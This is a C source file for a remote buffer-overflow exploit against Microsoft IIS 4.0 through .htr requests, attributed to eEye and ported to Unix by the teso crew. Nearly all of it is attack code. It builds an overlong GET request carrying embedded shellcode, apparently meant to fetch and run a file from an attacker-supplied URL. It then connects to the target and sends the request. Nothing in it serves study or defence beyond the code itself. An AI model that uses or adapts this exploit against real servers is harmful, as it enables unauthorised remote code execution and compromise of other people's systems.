/* iis 4.0 exploit
 * by eeye security
 *
 * ported to unix/C by the teso crew.
 *
 * shoutouts to #hax and everyone else knowing us...
 *  you know who you are.
 *
 * gcc -o tesoiis tesoiis.c -Wall
 */

#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <netinet/in.h>
#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int     net_connect (struct sockaddr_in *cs, char *server,
        unsigned short int port, char *sourceip,
        unsigned short int sourceport, int sec);

void    net_write (int fd, const char *str, ...);

unsigned long int       net_resolve (char *host);

char stuff[] = "\x42\x68\x66\x75\x41\x50"; /* "!GET /" */

#define URL_OFFSET      1055

char front[] = "GET /AAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
        "\x41\x41\x41\x41\x41\x41\xb0\x87\x67\x68\xb0\x87"
        "\x67\x68\x90\x90\x90\x90\x58\x58\x90\x33\xc0\x50"
        "\x5b\x53\x59\x8b\xde\x66\xb8\x21\x02\x03\xd8\x32"
        "\xc0\xd7\x2c\x21\x88\x03\x4b\x3c\xde\x75\xf4\x43"
        "\x43\xba\xd0\x10\x67\x68\x52\x51\x53\xff\x12\x8b"
        "\xf0\x8b\xf9\xfc\x59\xb1\x06\x90\x5a\x43\x32\xc0"
        "\xd7\x50\x58\x84\xc0\x50\x58\x75\xf4\x43\x52\x51"
        "\x53\x56\xb2\x54\xff\x12\xab\x59\x5a\xe2\xe6\x43"
        "\x32\xc0\xd7\x50\x58\x84\xc0\x50\x58\x75\xf4\x43"
        "\x52\x53\xff\x12\x8b\xf0\x5a\x33\xc9\x50\x58\xb1"
        "\x05\x43\x32\xc0\xd7\x50\x58\x84\xc0\x50\x58\x75"
        "\xf4\x43\x52\x51\x53\x56\xb2\x54\xff\x12\xab\x59"
        "\x5a\xe2\xe6\x33\xc0\x50\x40\x50\x40\x50\xff\x57"
        "\xf4\x89\x47\xcc\x33\xc0\x50\x50\xb0\x02\x66\xab"
        "\x58\xb4\x50\x66\xab\x58\xab\xab\xab\xb1\x21\x90"
        "\x66\x83\xc3\x16\x8b\xf3\x43\x32\xc0\xd7\x3a\xc8"
        "\x75\xf8\x32\xc0\x88\x03\x56\xff\x57\xec\x90\x66"
        "\x83\xef\x10\x92\x8b\x52\x0c\x8b\x12\x8b\x12\x92"
        "\x8b\xd7\x89\x42\x04\x52\x6a\x10\x52\xff\x77\xcc"
        "\xff\x57\xf8\x5a\x66\x83\xee\x08\x56\x43\x8b\xf3"
        "\xfc\xac\x84\xc0\x75\xfb\x41\x4e\xc7\x06\x8d\x8a"
        "\x8d\x8a\x81\x36\x80\x80\x80\x80\x33\xc0\x50\x50"
        "\x6a\x48\x53\xff\x77\xcc\xff\x57\xf0\x58\x5b\x8b"
        "\xd0\x66\xb8\xff\x0f\x50\x52\x50\x52\xff\x57\xe8"
        "\x8b\xf0\x58\x90\x90\x90\x90\x50\x53\xff\x57\xd4"
        "\x8b\xe8\x33\xc0\x5a\x52\x50\x52\x56\xff\x77\xcc"
        "\xff\x57\xec\x80\xfc\xff\x74\x0f\x50\x56\x55\xff"
        "\x57\xd8\x80\xfc\xff\x74\x04\x85\xc0\x75\xdf\x55"
        "\xff\x57\xdc\x33\xc0\x40\x50\x53\xff\x57\xe4\x90"
        "\x90\x90\x90\xff\x6c\x66\x73\x6f\x66\x6d\x54\x53"
        "\x21\x80\x8d\x84\x93\x86\x82\x95\x21\x80\x8d\x98"
        "\x93\x8a\x95\x86\x21\x80\x8d\x84\x8d\x90\x94\x86"
        "\x21\x80\x8d\x90\x91\x86\x8f\x21\x78\x8a\x8f\x66"
        "\x99\x86\x84\x21\x68\x8d\x90\x83\x82\x8d\x62\x8d"
        "\x8d\x90\x84\x21\x78\x74\x70\x64\x6c\x54\x53\x21"
        "\x93\x86\x84\x97\x21\x94\x86\x8f\x85\x21\x94\x90"
        "\x84\x8c\x86\x95\x21\x84\x90\x8f\x8f\x86\x84\x95"
        "\x21\x88\x86\x95\x89\x90\x94\x95\x83\x9a\x8f\x82"
        "\x8e\x86\x21\x90\x98\x8f\x4f\x86\x99\x86\x21"
/* stick it in here */
        "\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21"
        "\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21"
        "\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21"
        "\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21"
        "\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21"
        "\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21"
        "\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21"
        "\x21\x21\x21"
        ".htr HTTP/1.0";
        
void
usage (void)
{
        printf ("usage: ./tesoiis host port url\n");
        exit (EXIT_FAILURE);
}
        
int
main (int argc, char *argv[])
{
        /* yadda,yadda.. you can try exploiting our exploit!!
         * update: hmm.. is this exploitable? gets EIP touched by exit()?
         * gotta check this later...
         */
        
        char                    host[256], url[256];
        int                     port,sd,t = 0;
        int                     m = 0;
        char                    *cc, *pfft;
        struct sockaddr_in      cs;

        printf ("teso crew IIS exploit.. shellcode by eEye.\n");
        printf ("------------------------------------------\n");
        if (argc < 4)
                usage();
        
        strcpy (host, argv[1]);
        strcpy (url, argv[3]);

        port = atoi (argv[2]);
        if ((port < 1) || (port > 65535))
                usage();

        cc = url;
        pfft = front + URL_OFFSET;

        while (*cc) { 
                if (*cc == '/' && 0 == t) {
                        memcpy (pfft, stuff, 6);
                        pfft += 6;
                        t = 1;
                } else {
                        *pfft = *cc + 0x21;
                        pfft++;
                }
                cc++;
                m += 1;
        }

        printf ("Host: %s Port: %d Url: %s\n", host, port, url);
        
        printf ("Connecting... ");
        fflush (stdout);
        sd = net_connect (&cs, host, port, NULL, 0, 30);
   
        if (sd < 1) {
                printf ("failed!\n");
                exit (EXIT_FAILURE);
        }
         
        printf ("done.. sending shellcode..");
        fflush (stdout);
        
        net_write (sd, "%s\n\n", front);
        
        printf ("done.. closing fd!\n");
        close (sd);

        printf ("%s\n", front);

        exit (EXIT_SUCCESS);
}
        
int
net_connect (struct sockaddr_in *cs, char *server, unsigned short int port, char *sourceip,
                unsigned short int sourceport, int sec)
{
        int             n, len, error, flags;
        int             fd;
        struct timeval  tv;
        fd_set          rset, wset;

        /* first allocate a socket */
        cs->sin_family = AF_INET;
        cs->sin_port = htons (port);
                        
        fd = socket (cs->sin_family, SOCK_STREAM, 0);
        if (fd == -1)
                return (-1);
                        
        if (!(cs->sin_addr.s_addr = net_resolve (server))) {
                close (fd);
                return (-1);
        }

        flags = fcntl (fd, F_GETFL, 0);
        if (flags == -1) {
                close (fd);
                return (-1);
        }
        n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
        if (n == -1) {
                close (fd);
                return (-1);
        }

        error = 0;
        
        n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
        if (n < 0) {
                if (errno != EINPROGRESS) {
                        close (fd);
                        return (-1);
                }  
        }
        if (n == 0)
                goto done;
        
        FD_ZERO(&rset);
        FD_ZERO(&wset);
        FD_SET(fd, &rset);
        FD_SET(fd, &wset);
        tv.tv_sec = sec;
        tv.tv_usec = 0;

        n = select(fd + 1, &rset, &wset, NULL, &tv);
        if (n == 0) {
                close(fd);
                errno = ETIMEDOUT;
                return (-1);
        }
        if (n == -1)
                return (-1);
        
        if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
                if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
                        len = sizeof(error);
                        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
                                errno = ETIMEDOUT;
                                return (-1);
                        }
                        if (error == 0) {
                                goto done;
                        } else {
                                errno = error;
                                return (-1);
                        }
                }
        } else
                return (-1);
 
done:
        n = fcntl(fd, F_SETFL, flags);
        if (n == -1)
                return (-1);
        return (fd);
}
                
unsigned long int
net_resolve (char *host)
{
        long            i;
        struct hostent  *he;

        i = inet_addr(host);
        if (i == -1) { 
                he = gethostbyname(host);
                if (he == NULL) {
                        return (0);
                } else {
                        return (*(unsigned long *) he->h_addr);
                }
        }
        return (i);  
}

void
net_write (int fd, const char *str, ...)
{
        char    tmp[8192];
        va_list vl;
        int     i;
                
        va_start(vl, str);
        memset(tmp, 0, sizeof(tmp));
        i = vsnprintf(tmp, sizeof(tmp), str, vl);
        va_end(vl);

        send(fd, tmp, i, 0);
        return;
}

